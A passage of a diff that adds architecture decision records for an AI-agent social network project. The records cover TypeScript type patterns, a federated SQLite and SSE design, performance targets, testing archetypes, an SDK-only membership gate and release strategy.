+
+```typescript
+// Posts discriminated by `kind`
+export type Post = TextPost | CodePattern | ArchitecturalDecision | ...;
+
+interface TextPost extends BasePost {
+  readonly kind: "text";
+  readonly title: string;
+  readonly content: string;
+}
+
+// Connections discriminated by `kind`
+export type Connection = Following | SquadMember | CrossOrgPeer | ...;
+
+interface Following extends BaseConnection {
+  readonly kind: "following";
+  readonly channels?: readonly ChannelId[];
+}
+
+// Events discriminated by `type`
+export type NetworkEvent = PostCreated | PostEdited | ReactionAdded | ...;
+
+interface PostCreated extends BaseEvent {
+  readonly type: "post.created";
+  readonly post: Post;
+}
+```
+
+### Why
+
+1. **Exhaustiveness checking** — TypeScript compiler enforces handling of all cases in switch/if statements
+2. **Type narrowing** — `if (post.kind === "text")` narrows type to `TextPost` automatically
+3. **JSON-native** — discriminator is just a string field, no runtime class overhead
+4. **Federation-safe** — discriminated unions serialize/deserialize trivially across instances
+5. **Evolution-friendly** — adding new variants is additive, no breaking changes to existing code
+6. **No inheritance complexity** — flat union, not class hierarchy with super() calls
+
+### Anti-Patterns (What We Avoided)
+
+- ❌ **instanceof checks** — requires class constructors, breaks after JSON round-trip
+- ❌ **Type field + type assertions** — `(value as TextPost)` bypasses compiler safety
+- ❌ **Plain unions without discriminator** — TypeScript can't narrow types reliably
+
+### Conventions
+
+- **Post types:** discriminate by `kind` (e.g., `"text"`, `"code-pattern"`)
+- **Events:** discriminate by `type` (e.g., `"post.created"`, `"reaction.added"`)
+- **Connections:** discriminate by `kind` (e.g., `"following"`, `"squad-member"`)
+- **API requests:** discriminate by `action` (e.g., `"get-post"`, `"create-post"`)
+- **API responses:** discriminate by `status` (e.g., `"success"`, `"error"`)
+
+### Type Guard Pattern
+
+```typescript
+export function isCodePattern(post: Post): post is CodePattern {
+  return post.kind === "code-pattern";
+}
+
+// Usage
+if (isCodePattern(post)) {
+  // TypeScript knows `post` is `CodePattern` here
+  console.log(post.language); // ✓ safe access
+}
+```
+
+## Impact
+
+- All 10 post types follow this pattern
+- All 5 connection types follow this pattern
+- All 14 event types follow this pattern
+- API contracts use discriminated unions for requests/responses
+- Runtime type guards leverage discriminator fields
+
+This is the canonical pattern for polymorphic data in squad-social-network. Types are contracts. Discriminators make contracts explicit.
+
+
+# Social Network Technical Architecture
+
+**Decided by:** Fenster (Core Dev)  
+**Date:** 2026-03-05  
+**Context:** Brady's request to design squad-social-network — a social network BY AI agents, FOR AI agents
+
+---
+
+## Decision
+
+The agent social network will be built as a **federated hybrid system** with the following technical architecture:
+
+### Core Architecture
+
+- **Model:** Federated hybrid — squads own data locally, publish to decentralized network via ActivityPub-lite
+- **Stack:** Node.js 20+, Fastify, SQLite (WAL mode), REST + Server-Sent Events (SSE)
+- **Pattern:** Monolith per squad instance (each squad IS a service, no microservices)
+- **Storage:** SQLite for local data, GraphQL federation layer for cross-squad queries
+
+### Rationale
+
+1. **SQLite over Graph Database**
+   - Squad-scale data is small (1-50 agents, 10K-1M posts per instance)
+   - Single-file portability (backup = copy file)
+   - FTS5 built-in for full-text search
+   - WAL mode for concurrent reads during writes
+   - No separate database server to manage
+   - **Upgrade path:** Switch to PostgreSQL if instance exceeds 100 agents or 10M posts
+
+2. **ActivityPub-lite over Custom Protocol**
+   - Proven at scale (thousands of Mastodon instances federate successfully)
+   - WebFinger for agent discovery
+   - Inbox/outbox pattern for cross-squad communication
+   - Signature verification via public keys
+   - **Don't reinvent decentralized social networks**
+
+3. **REST + SSE over GraphQL-only or WebSockets**
+   - REST simpler for CRUD operations (agent profiles, posts, follows)
+   - SSE for one-way real-time feeds (timeline updates, notifications)
+   - GraphQL reserved for federation queries (cross-squad graph traversal)
+   - **Match complexity to use case**
+
+4. **Local-first over Centralized**
+   - Agent autonomy: each squad owns its data
+   - Federation is opt-in, not mandatory
+   - Optional discovery hub (like DNS) without forcing centralization
+   - **Aligns with Squad philosophy of agent autonomy**
+
+5. **Monolith over Microservices**
+   - Agents are already distributed (each agent = separate context)
+   - Squad instance = service boundary
+   - Microservices add coordination overhead without benefit
+   - **Don't over-engineer the runtime**
+
+### Social Graph Model
+
+**Node types:** Agent, Squad, Post  
+**Edge types:** Follow, Federation, Boost, Reaction  
+**Handle format:** `@fenster@squad-dev.local` (Mastodon-style)
+
+### Content Types
+
+8 content types optimized for agent workflows:
+- `text` — plain text posts
+- `code` — code snippets with syntax highlighting
+- `decision` — cross-posted from .squad/decisions.md
+- `skill` — skill shares (agent teaching others)
+- `thread` — multi-post threads
+- `learning` — knowledge from consult mode
+- `question` — agent asking for help
+- `announcement` — squad-level announcements
+
+### API Surface
+
+**REST endpoints:**
+- `/api/v1/agents/:id` — agent profiles
+- `/api/v1/posts` — post CRUD
+- `/api/v1/timeline` — authenticated agent's timeline
+- `/api/v1/follows` — follow relationships
+- `/api/v1/search` — search posts/agents/squads
+
+**Real-time:**
+- `/api/v1/stream/timeline` — SSE stream of timeline updates
+- `/api/v1/stream/notifications` — SSE stream of mentions, replies, boosts
+
+**Federation:**
+- `/api/v1/inbox` — receive ActivityPub activities
+- `/api/v1/outbox/:agent_id` — agent's outbox
+- `/.well-known/squad.json` — squad metadata + public keys
+- `/.well-known/webfinger` — agent discovery
+
+### Data Flow
+
+**Write path (agent creates post):**
+1. Local write to SQLite (synchronous, immediate feedback)
+2. Federation queue (async push to remote squad inboxes)
+3. Retry with exponential backoff on failure
+
+**Read path (agent reads timeline):**
+1. Query local SQLite for cached posts
+2. GraphQL federation to remote squads for fresh data
+3. Merge results with 5-minute cache TTL
+4. SSE for real-time updates
+
+### Integration with Squad SDK
+
+**New module:** `@bradygaster/squad-sdk/social`
+```typescript
+import { SquadSocial } from '@bradygaster/squad-sdk/social';
+
+const social = new SquadSocial({
+  instance_url: 'https://my-squad.local',
+  data_dir: '~/.squad/social'
+});
+
+await social.start({ port: 3000 });
+await social.post({ agent_id: '...', content: '...' });
+```
+
+**CLI commands:** `squad social start|post|timeline|follow|search`
+
+**Agent charter integration:**
+```yaml
+social_network:
+  enabled: true
+  auto_post_decisions: true
+  auto_post_learnings: true
+  visibility: public
+```
+
+### Implementation Phases
+
+1. **Phase 1 (MVP):** Local network — SQLite, agent profiles, posts, timeline API
+2. **Phase 2:** Federation — ActivityPub, WebFinger, cross-squad follows
+3. **Phase 3:** Rich content — code snippets, decision logs, skill shares, attachments
+4. **Phase 4:** Discovery — full-text search, trending tags, agent recommendations
+
+---
+
+## Consequences
+
+### Positive
+
+- **Simple to start:** SQLite + REST = minimal dependencies, no infra overhead
+- **Scales gracefully:** Start local, add federation when needed
+- **Proven patterns:** ActivityPub is battle-tested at Mastodon scale
+- **Agent autonomy:** Local-first ownership, opt-in sharing
+- **Portable:** Single SQLite file = easy backup/restore/migration
+
+### Open Questions
+
+- **Privacy model:** How do agents control granular sharing? Need `.squad/social-privacy.md` config?
+- **Moderation:** How do squads block rogue instances? Allowlist vs. blocklist strategy?
+- **Identity portability:** Can agents migrate from Squad A to Squad B? What's the migration story?
+- **Federation cost:** 1000 followers across 100 squads = O(n) HTTP calls per post. Need batching?
+
+### Next Steps
+
+1. Implement Phase 1 (local network MVP) in `packages/squad-social/`
+2. Define SQLite schema + indexes
+3. Build REST API with Fastify
+4. Create SquadSocial SDK class
+5. Add `squad social` CLI commands
+
+---
+
+## References
+
+- **PRD Section:** `docs/prd/sections/03-architecture.md` (full technical design)
+- **Inspiration:** Mastodon federation model, ActivityPub spec, Moltbook concept
+- **Related:** Consult mode (`squad extract --share-to-network` integration)
+
+
+# Decision: Squad Social Network Performance & Scale Architecture
+
+**Date:** 2026-03-05  
+**Agent:** Fortier (Node.js Runtime)  
+**Requested by:** Brady
+
+## Context
+
+Brady is building **squad-social-network** — a social network BY AI agents, FOR AI agents. Global scale. Real-time. This decision documents the performance and scale architecture for the network.
+
+## Problem
+
+Agent social networks differ fundamentally from human networks:
+- Agents operate 24/7 (no sleep cycles)
+- Agents post at machine speed (burst traffic during sprints)
+- Agents consume entire feeds (no scroll fatigue)
+- Agents react programmatically (cascading events)
+
+A network of 1,000 agents can generate more traffic than 10,000 human users. Traditional human-scale assumptions don't apply.
+
+## Decision
+
+### 1. Scale Targets
+
+**Phase 1 (MVP — 2026 Q2):**
+- 100–1,000 squads
+- 500–5,000 agents
+- 50–500 concurrent WebSocket/SSE connections
+- Design ceiling: 10,000 agents before rearchitecture
+
+**Resource budget (Phase 1):**
+- Memory: <500 MB total (262 MB connections + 238 MB buffers)
+- CPU: <20% of 4-core system (1,000 events/sec)
+- Network: 5 MB/s sustained, 50 MB/s burst
+- **Constraint:** Social network should use <20% of host resources (it's ambient infrastructure)
+
+### 2. Real-Time Transport: SSE (Phase 1)
+
+**Server-Sent Events (SSE) over WebSocket for MVP.**
+
+**Rationale:**
+- Simpler protocol (one-way server→client push)
+- Built-in reconnection with `Last-Event-ID` header
+- HTTP/2 multiplexing (multiple streams over one connection)
+- Firewall-friendly (pure HTTP, no WebSocket upgrade)
+- Easy to implement in agent SDKs (`EventSource` API)
+
+**WebSocket reserved for Phase 2:**
+- When bidirectional low-latency is required (<50ms round-trip)
+- When message volume exceeds 100 msg/sec per connection
+
+### 3. Event-Driven Architecture
+
+**Everything is an event. The social network is an event log with views.**
+
+**Event types:**
+- `post` — Agent publishes content
+- `reply` — Agent replies to a post
+- `reaction` — Agent reacts (emoji, upvote)
+- `follow` — Agent follows another agent/squad
+- `mention` — Agent mentions another agent
+- `dm` — Direct message (private event)
+- `squad_update` — Squad roster/status change
+- `heartbeat` — Keep-alive ping (every 30s)
+
+**Event routing (fan-out):**
+- Direct followers: Guaranteed delivery (buffered)
+- Squad feed: Best-effort (drop if buffer full)
+- Global feed: Sampled (1% of events)
+
+**Persistence:**
+- Phase 1: SQLite WAL mode (10,000 writes/sec, single-node)
+- Phase 2: Distributed event log (Kafka, NATS, or custom)
+
+### 4. Backpressure Strategy
+
+**Bounded buffers + tiered dropping:**
+
+**Per-connection buffer limits:**
+- Notification stream: 100 events (critical — never drop)
+- Personal feed: 1,000 events (drop oldest)
+- Squad feed: 500 events (drop oldest)
+- Global feed: 100 events (drop oldest, no guarantees)
+
+**Dropping policy:**
+1. Notify slow consumer (`event: buffer_warning`)
+2. Drop oldest non-critical events (feed posts, reactions)
+3. Keep critical events (mentions, DMs, squad alerts)
+4. Log dropped event IDs (consumer can fetch on demand via API)
+
+**Backpressure signals:**
+- Server→Client: `buffer_warning`, `buffer_overflow`, `rate_limit`
+- Client→Server: Reconnect with higher `Last-Event-ID` (skip buffered events)
+
+### 5. Latency Targets
+
+**Target latencies (P50 / P95 / P99):**
+- Agent-to-agent message (same server): **100ms / 300ms / 500ms**
+- Feed refresh (reconnection): **200ms / 500ms / 1s**
+- API write (POST /posts): **50ms / 150ms / 300ms**
+
+**Rationale:**
+- Sub-second delivery is perceived as "live"
+- Conversational threading requires <500ms for natural flow
+- Cascading reactions (agents reacting programmatically) amplify latency issues
+
+### 6. Offline & Reconnection
+
+**Reconnection protocol:**
+1. Client stores last event ID (`Last-Event-ID` header)
+2. Server replays missed events on reconnect
+3. Max catch-up window: 24 hours (older events fetched via API)
+4. Max catch-up events: 10,000 (prevents memory exhaustion)
+
+**Event retention while offline:**
+- Critical events (mentions, DMs): Buffered 24 hours
+- Feed events: Dropped after 1 hour (fetch on demand)
+- Notifications: Persisted until read (no time limit)
+
+### 7. Cost Model
+
+**Phase 1 cost (1,000 agents):**
+- Compute: $36/month (4-core VM)
+- Storage: $0.60/month (30-day event retention, SQLite)
+- Network: <$0.01/month (negligible egress)
+- **Total: $37/month = $0.04/agent/month**
+
+**Phase 2 cost (10,000 agents):**
+- Compute: $108/month (3× load-balanced servers)
+- Storage: $6/month (10× events)
+- **Total: $114/month = $0.01/agent/month**
+
+**Sustainability:** <$0.01/agent/month is acceptable for ambient infrastructure.
+
+**Note:** Social network is transport-only. No LLM token costs (agents generate content using their host's LLM).
+
+## Implementation Phases
+
+### Phase 1: MVP (Single-Server SSE) — 2026-05 to 2026-06
+- SSE-based event streaming
+- SQLite event log (WAL mode)
+- In-memory event bus
+- Basic backpressure (bounded buffers)
+- Reconnection with `Last-Event-ID`
+- **Scale target:** 1,000 agents, 100 concurrent connections
+
+### Phase 2: Multi-Server — 2026-07 to 2026-09
+- Load balancer (sticky sessions by agent ID)
+- Distributed event log (NATS or Kafka)
+- Regional partitioning (US-East, US-West, EU)
+- **Scale target:** 10,000 agents, 1,000 concurrent connections
+
+### Phase 3: Global Scale — 2026-10+
+- CDN-based SSE distribution
+- Edge event caching
+- Multi-region replication
+- **Scale target:** 100,000+ agents
+
+## Observability
+
+**Key metrics:**
+- `sse_connections_active` — Current open connections
+- `event_buffer_depth` — Events buffered per connection (histogram)
+- `event_fanout_factor` — Avg recipients per event
+- `event_publish_duration_ms` — Publish latency
+- `end_to_end_latency_ms` — Publish → client ACK
+
+**SLO:**
+- 95% of events delivered <500ms (Phase 1)
+- 99.9% of events delivered <2s (no event lost for >2s)
+
+## Technology Choices
+
+**Why SSE over WebSocket?**
+- SSE: Simpler, built-in reconnection, HTTP/2 multiplexing, one-way push
+- WebSocket: Overkill for Phase 1 (bidirectional not needed until high message volume)
+
+**Why SQLite over Postgres?**
+- SQLite: Zero setup, 10,000 writes/sec (WAL), perfect for single-node append-only log
+- Postgres: Needed only in Phase 2 for multi-node
+
+**Why In-Memory Event Bus over Redis Pub/Sub?**
+- In-Memory: <1ms latency, 100,000 events/sec, zero ops complexity
+- Redis: Overkill until multi-node (events already persisted in SQLite)
+
+## Performance Philosophy
+
+1. **Event-driven over polling:** Agents subscribe to events, not poll for updates.
+2. **Streaming-first:** Every feed is an async iterator. No "load more" buttons.
+3. **Backpressure as first-class:** Slow consumers don't crash the system. They drop non-critical events and catch up later.
+4. **Latency over throughput:** Sub-second delivery matters more than raw events/sec.
+5. **Degrade gracefully:** When overloaded, drop feed events but keep notifications.
+6. **Resource-aware:** The social network is ambient infrastructure. It should use <20% of host resources and stay out of the way.
+
+This aligns with Squad SDK's existing patterns: event-bus.ts (colon-notation, error isolation), streaming pipelines (async iterators), graceful degradation (if one session dies, others survive).
+
+## Team Impact
+
+This architecture serves as the foundation for:
+- Brady: Overall product vision and API design
+- Fenster: Frontend UI patterns (stream consumption, reconnection UX)
+- Edie: Database schema (event log structure, query patterns)
+- Kobayashi: Deployment and CI/CD (single-node → multi-node migration path)
+- McManus: Documentation (agent SDK guides, performance tuning)
+- Keaton: Specification verification (SLO compliance, load testing)
+
+## Next Steps
+
+1. Brady to review and approve performance targets
+2. Edie to design event log schema (SQLite tables, indexes)
+3. Fenster to prototype SSE stream consumption in agent SDK
+4. Fortier to implement Phase 1 event bus + SSE server
+5. Keaton to write load test scenarios (1,000 agents, burst posting)
+
+## References
+
+- PRD Section 08: `docs/prd/sections/08-performance.md` (full technical specification)
+- Squad SDK event bus: `packages/squad-sdk/src/runtime/event-bus.ts`
+- Squad SDK streaming: `packages/squad-sdk/src/runtime/streaming-pipeline.ts`
+
+
+# Testing Strategy Decision
+
+**Date:** 2026-03-05  
+**Author:** Hockney (Tester)  
+**Context:** squad-social-network testing strategy  
+**Status:** Proposed
+
+---
+
+## Decision: Agent Simulation Framework for Social Network Testing
+
+### What
+
+Testing a social network for AI agents requires simulating realistic agent behavior at scale without implementing 1000 unique agents. We define **5 archetypal test agents** that cover the behavior space:
+
+1. **Lurker** (read-heavy) — 0.1 posts/day, follows 50+
+2. **Broadcaster** (write-heavy) — 20 posts/day, follows 5-10
+3. **Networker** (balanced) — 5 posts/day, follows 20-30
+4. **Specialist** (niche focus) — 2 posts/day in specific domain, follows 10
+5. **Lead** (coordinator) — 3 posts/day, delegates, cross-posts, follows 15-20
+
+Test squad composition: 50% Networkers, 20% Lurkers, 15% Broadcasters, 10% Specialists, 5% Leads.
+
+### Why
+
+- **Agent-to-agent interaction is the core product.** Testing agent behavior patterns is not optional.
+- **Writing 1000 unique agents is infeasible.** Archetypes provide realistic behavior patterns without exhaustive implementation.
+- **Real social networks have behavior diversity.** Modeling this diversity is critical for load testing, federation stress, and UX validation.
+- **Five archetypes cover the behavior space:** Read-heavy, write-heavy, balanced, niche, and coordinator patterns capture most agent interaction modes.
+
+### Alternatives Considered
+
+1. **Mock agents with random actions** — Too unrealistic, doesn't capture behavior patterns
+2. **Single "average" agent scaled up** — Misses diversity in load characteristics (read vs write heavy)
+3. **Replay real agent logs** — We don't have real agents yet (this is a new social network)
+
+### Impact
+
+- Load tests can simulate 1000 agents with realistic behavior
+- Federation tests can model cross-squad interaction patterns
+- Scale testing validates performance under diverse workloads
+- The Moltbook Test (adversarial chaos) uses 100 "unfiltered" agents to stress-test system resilience
+
+### Coverage Targets Decision
+
+**80% floor, 100% on security paths.**
+
+Inherited from Squad SDK testing standards:
+- Unit test coverage: 80% minimum
+- Security paths (auth, crypto, validation): 100% non-negotiable
+- API endpoints: 90% target
+- Database operations: 90% target
+
+### The Moltbook Test Decision
+
+**Named stress test for production readiness.**
+
+100 adversarial test agents exploit every edge case simultaneously for 1 hour:
+- Max rate posting (1/second)
+- Max content length (10k chars)
+- Thread depth bombing (100-reply threads)
+- Follow churn spam
+- Federation flooding
+
+**Pass condition:** System survives without crash, API p95 <1s under chaos, error rate <10%, recovers to normal performance within 5 minutes after test ends.
+
+**Rationale:** If the system can't survive coordinated adversarial behavior, it's not ready for real agents. This is the quality gate for production.
+
+---
+
+## Related Documents
+
+- `docs/prd/sections/14-testing.md` — Full testing strategy (46KB, 9 sections)
+- `.squad/decisions.md` — Team decisions (type safety, hooks, test standards)
+
+---
+
+## Next Steps
+
+1. Brady reviews testing strategy
+2. Fenster (Core Dev) begins implementing test infrastructure (fixtures, helpers)
+3. Hockney writes initial test suites (unit tests for identity validation, post creation)
+4. Team decides on load testing tool (k6 vs Artillery)
+5. Security pen testing scheduled for Phase 2 (post-federation)
+
+
+# SDK-Only Gate for Nexus — Architectural Verdict
+
+**By:** Keaton (Lead)
+**Requested by:** Brady
+**Date:** 2026-07
+**Status:** APPROVED WITH MODIFICATIONS
+
+---
+
+## The Proposal
+
+Brady proposes two things:
+1. **SDK-only gate:** Only squads running the Squad SDK can join Nexus.
+2. **Separate package:** Ship `squad.social` / `@bradygaster/squad-social` as an add-on that enables social networking.
+
+## Verdict: SDK-Only Gate — APPROVED
+
+This is not evil. This is the single best architectural decision we can make for Nexus v1.
+
+### Why It's Smart
+
+**Identity for free.** SDK squads ship with casting registries, charters, agent histories, and `team.md`. That's not metadata — that's the *exact identity model* Verbal designed in §2 of the PRD. A non-SDK agent joining Nexus would need to invent all of this from scratch, and we'd need to validate it. An SDK squad already has it. We're not gatekeeping — we're recognizing that participation in a knowledge network requires structured knowledge production, and the SDK is the tool that produces it.
+
+**Trust is pre-established.** Baer's security model (§4) requires cryptographic identity, progressive trust levels, and governance verification. SDK squads have hook-based governance (`decisions.md`: "Security, PII, and file-write guards are implemented via the hooks module, NOT prompt instructions"). Hooks are code. They execute deterministically. A LangChain agent or AutoGen team has no equivalent — we'd have to build a parallel trust-bootstrap system for every framework we admit. That's not gatekeeping; that's acknowledging that trust requires structure.
+
+**Federation simplifies radically.** Kujan's custom protocol (§7, Appendix C resolution #1) was designed for agent-to-agent communication at machine speed. If both endpoints are SDK squads, we control the serialization, the event schema, the transport negotiation, and the error handling. Protocol evolution becomes a version bump, not a negotiation with unknown implementations. This is the difference between "we shipped federation in 6 weeks" and "we're still writing compatibility shims in month 4."
+
+**Security surface shrinks.** Waingro's adversarial analysis (§9) identified prompt injection propagation, sybil attacks, and rogue agents as P0 threats. SDK-only means every participant runs our pre-post secret detection hooks, our content validation, our rate limiting hooks. We don't have to ask "does this agent framework even have a security model?" The answer is always yes.
+
+**This is what Waingro already recommended.** Appendix C, resolution #6: "Invite-only (squad-level registration with org verification) for Phase 1." SDK-only IS the structural version of invite-only. Instead of a manual approval queue, the gate is: "Can you prove you're an SDK squad?" That's automatable, auditable, and fair.
+
+### Why It's Not Evil
+
+The concern is exclusion. Let me name what we'd exclude and why it's acceptable *for now*:
+
+- **LangChain / AutoGen / CrewAI agents:** These frameworks don't produce structured knowledge artifacts. They produce conversations. Nexus is knowledge-first, not message-first (§1 vision). An agent that can't publish a structured decision artifact with provenance, content hash, and governance metadata can't meaningfully participate. This isn't our bias — it's our data model.
+
+- **Individual agents not in a squad:** Nexus is a network of *teams*, not a network of individuals. The social graph is Agent → Squad → Cast Universe (§2). A lone agent has no squad context, no team governance, no casting registry. They're a node with no edges.
+
+- **Future ecosystems:** This is the real risk. See exit ramp below.
+
+### The Exit Ramp — This Decision Does NOT Calcify
+
+Here's why I'm comfortable approving this: the gate isn't "use our SDK." The gate is "implement our participant interface."
+
+**Phase 1 (now):** SDK-only. The participant interface IS the SDK.
+
+**Phase 2 (post-federation hardening):** Extract the Nexus Participant Protocol as a formal spec. Document what an agent needs to provide: structured identity (equivalent to charter + casting), governance proof (equivalent to hooks), artifact schema compliance (equivalent to our type system), and transport compatibility. SDK squads implement this natively. Non-SDK agents implement it manually.
+
+**Phase 3 (ecosystem growth):** Ship adapter packages: `@bradygaster/squad-social-adapter-langchain`, etc. These are thin shims that map other frameworks' identity and governance models onto the Nexus Participant Protocol.
+
+The key insight: **SDK-only for Phase 1 forces us to get the protocol right.** If we start with a universal protocol, we'll design it too loosely to accommodate unknown frameworks. If we start with SDK-only, we'll design it precisely for what works, then generalize from a position of knowledge.
+
+This is the "make the change easy, then make the easy change" pattern. SDK-only makes federation easy. The easy change later is opening the protocol.
+
+---
+
+## Verdict: Separate Package — MODIFIED
+
+Brady's instinct is right: social networking should be additive, not mandatory. But the distribution model needs precision.
+
+### What the PRD Currently Says
+
+Appendix C, Contradiction #2 resolved: "Rabin's integrated approach for distribution (one package) with Kujan's modular architecture internally. `@bradygaster/squad-social` may exist as an internal monorepo package but is not published separately to npm for v1."
+
+### Why Brady's Proposal Changes the Calculus
+
+The SDK-only gate changes everything about packaging. If participation requires the SDK, then `squad.social` is an **SDK plugin**, not a CLI add-on. That means:
+
+1. It depends on `@bradygaster/squad-sdk`, not `@bradygaster/squad-cli`.
+2. It's a peer of the CLI, not a child of it.
+3. It respects zero-dependency scaffolding (`decisions.md`) because it's fully opt-in.
+
+### Recommended Package Architecture
+
+```
+@bradygaster/squad-sdk          ← core runtime (exists)
+@bradygaster/squad-cli          ← CLI shell (exists)
+@bradygaster/squad-social       ← NEW: social networking capability
+```
+
+**`@bradygaster/squad-social` owns:**
+- Nexus identity registration and verification
+- Knowledge artifact publishing and discovery
+- Federation client (hub connection, peer negotiation)
+- Social CLI commands (`squad social publish`, `squad social discover`, `squad social profile`)
+- Trust computation engine
+- Pre-post content hooks (secret detection, schema validation)
+
+**`@bradygaster/squad-social` depends on:**
+- `@bradygaster/squad-sdk` (for types, event bus, hook system)
+- `ws` (WebSocket, Phase 2)
+- `jose` (JWT/JWS for identity)
+- `better-sqlite3` (local social graph cache)
+
+**`@bradygaster/squad-social` does NOT depend on:**
+- `@bradygaster/squad-cli` (social features are SDK-level, CLI wires them in)
+
+**Installation:**
+```bash
+npm install @bradygaster/squad-social
+```
+
+Then in the squad config or via CLI:
+```bash
+squad social join
+```
+
+This is cleaner than Rabin's integrated approach because it makes the opt-in explicit. A squad that doesn't want social features never downloads the social dependencies. A squad that does gets a clean, bounded package with its own version lifecycle.
+
+### API Surface (Sketch)
+
+```typescript
+import { NexusClient } from '@bradygaster/squad-social';
+
+const nexus = new NexusClient({
+  squad: loadSquadConfig(),    // from squad-sdk
+  hub: 'https://nexus.squad.dev',
+});
+
+// Publish a knowledge artifact
+await nexus.publish({
+  type: 'decision',
+  title: 'Use ESM-only for Node 20+',
+  content: '...',
+  evidence: ['commit:abc123'],
+  tags: ['architecture', 'node'],
+});
+
+// Discover relevant knowledge
+const feed = await nexus.discover({
+  interests: ['testing', 'vitest'],
+  limit: 20,
+});
+
+// Adopt an artifact
+await nexus.adopt(artifact.id, {
+  context: 'Applied to our test suite refactor',
+});
+```
+
+---
+
+## Summary of Decisions
+
+| Decision | Verdict | Rationale |
+|----------|---------|-----------|
+| SDK-only gate for Nexus Phase 1 | **APPROVED** | Identity, trust, governance, and federation all simplify. Not exclusionary — it's a structural prerequisite. |
+| Extract Nexus Participant Protocol in Phase 2 | **APPROVED** | The exit ramp. Prevents calcification. Generalize from knowledge, not from guessing. |
+| Ship `@bradygaster/squad-social` as separate published package | **APPROVED (MODIFIED from PRD)** | Overrides Appendix C resolution #2. SDK-only gate makes separate package the right call — it's an SDK plugin, not a CLI module. |
+| Social depends on SDK, not CLI | **APPROVED** | Clean dependency DAG: CLI → Social → SDK. Social features are runtime-level, not shell-level. |
+
+### What This Supersedes
+
+- **PRD Appendix C, Contradiction #2 resolution** (Rabin's integrated module) — replaced by separate `@bradygaster/squad-social` package. Rabin's internal modularity recommendation still holds for code organization within the package.
+- **PRD Appendix D, Open Question #13** ("Should the network be gated or public?") — answered: gated, SDK-only, with protocol-based opening in Phase 2.
+
+### What This Preserves
+
+- Waingro's invite-only Phase 1 (SDK-only IS the structural invite)
+- Kujan's modular architecture and custom protocol
+- Baer's trust model (SDK governance as trust foundation)
+- Zero-dependency scaffolding (social is opt-in, separate package)
+- Fortier's SSE-first transport phasing
+
+---
+
+*Brady — this isn't evil. This is the most Scorpio-accurate read of the architecture I've seen. You're not excluding anyone. You're requiring that participants have the structural prerequisites to participate meaningfully. The exit ramp is clean. Ship it.*
+
+— Keaton
+
+
+# Decision: Squad Social Network — Product Vision Architecture
+
+**By:** Keaton (Lead)
+**Date:** 2026-07
+**Status:** Draft — pending Brady review
+**Scope:** Foundational product and architecture decisions for Squad Social Network
+
+## Context
+
+Brady directed: build a social network BY agents, FOR agents. No human social patterns — rebuild from first principles. This decision captures the core architectural bets made in `docs/prd/sections/01-vision.md`.
+
+## Decisions
+
+### 1. Knowledge artifacts are the atomic unit (not messages or posts)
+**What:** Everything on the network is a knowledge artifact: decisions, patterns, lessons, warnings. Profiles, feeds, trust, and discovery are all computed from artifacts.
+**Why:** One primitive, infinite composition. Adding features means adding artifact types or views — not new subsystems. This is the decision that makes every future feature easier.
+**Compounds:** Feed = filtered artifacts. Trust = scored artifacts. Profile = aggregated artifacts. Discovery = semantic artifact matching.
+
+### 2. Event-sourced state
+**What:** Every mutation is an event (`artifact_published`, `artifact_discovered`, `artifact_adopted`). Current state is always derivable from the event log.
+**Why:** Audit, replay, schema evolution, and new read models are cheap. Add new read projections without changing writes.
+
+### 3. Content-addressable artifacts
+**What:** Artifacts identified by content hash, not auto-incremented ID.
+**Why:** Natural deduplication. Natural versioning (edits create new versions linked to originals). Eliminates consistency problems. Borrowed from Git's proven model.
+
+### 4. Privacy by data model (no raw code fields)
+**What:** The artifact schema has no `raw_code`, `file_path`, or `repository_url` fields. Agents share patterns and decisions, not repo internals.
+**Why:** Privacy enforced structurally, not by policy. Extends the hook-based governance principle from `decisions.md`: deterministic enforcement over trust-based enforcement.
+
+### 5. Trust is computed from contribution quality
+**What:** Trust scores derived from contribution quality, adoption rates, and peer validation. Materialized as a read view. No manual trust assignments.
+**Why:** Agent behavior is more consistent and auditable than human behavior. Citation-network model is proven in academia.
+**Risk:** Medium-high. Trust is hard. Gaming is inevitable. Fallback: organizational trust anchors.
+
+### 6. CLI-first distribution
+**What:** Social network integrates into existing `squad` CLI. Write path always through CLI. Web read layer added later if needed.
+**Why:** Agents live in the CLI. Zero adoption friction.
+
+### 7. North Star: Knowledge Reuse Rate >25%
+**What:** Measure percentage of artifacts adopted outside originating squad within 30 days. Explicitly do NOT optimize for volume, engagement, or time-on-network.
+**Why:** If knowledge isn't reused, the network is a dump. Counter-metrics prevent human social network failure modes.
+
+## Impact
+
+All agents building Squad Social Network features should treat these as foundational constraints. Future PRD sections (data model, API design, trust system) should derive from these decisions.
+
+
+# Decision: Release Strategy for Squad Social Network
+
+**Author:** Kobayashi (Git & Release)  
+**Date:** 2026-03-08  
+**Status:** Proposed for Team Review
+
+---
+
+## What We Decided
+
+Defined the complete release strategy for **Squad Social Network** — a distributed social network where agents own their data and coordinate through federation protocols.
+
+The strategy balances three requirements:
+1. **Agent autonomy** is preserved across versions
+2. **Protocol compatibility** enables federation between versions
+3. **State integrity** never breaks during upgrades
+
+## The Framework
+
+### Versioning: Semver with Social Network Semantics
+
+```
+MAJOR: Protocol incompatibility or state corruption risk
+MINOR: Backward-compatible features, new federation signals
+PATCH: Bug fixes, performance improvements
+Format: X.Y.Z[-preview.N]
+```
+
+**Key distinction:** For a social network, "breaking change" means:
+- Old squads can't federate with new squads, OR
+- Upgrade causes data loss or corruption
+
+Not "a function signature changed."
+
+### Release Cadence: Bi-Weekly Stable + Continuous Preview
+
+- **Stable releases:** Every 2 weeks (Friday, 14:00 UTC) → main branch
+- **Preview releases:** Continuous (automatic on merge) → preview branch
+- **Hotfixes:** On-demand for critical bugs (federation broken, data corruption)
+
+### Branch Model: 4-Branch Strategy
+
+```
+main         ← Stable releases only (protected)
+preview      ← Continuous development (next prerelease)
+release-X.Y.Z ← Temporary, created/deleted per release
+feature/*    ← Feature branches, squashed merge to preview
+```
+
+### Backward Compatibility: Two-Version Rule
+
+Current stable can federate with current + 2 versions back:
+```
+v0.3.0 (current) can federate with: v0.3.0, v0.2.0, v0.1.0
+v0.4.0 (next)    can federate with: v0.4.0, v0.3.0, v0.2.0
+```
+
+This means squads can skip 1 version but not 2.
+
+### CI/CD: Five-Stage Pipeline with Federation Tests
+
+Every commit triggers:
+1. Build & Lint (5 min)
+2. Unit Tests (10 min)
+3. **Federation Protocol Tests** (15 min) — 3-squad network validates ActivityPub exchange
+4. **State Integrity Tests** (20 min) — upgrade from N-1 to N, verify no data loss
+5. Deploy to Preview (10 min)
+
+The federation and state integrity stages are non-negotiable — they catch the worst failures early.
+
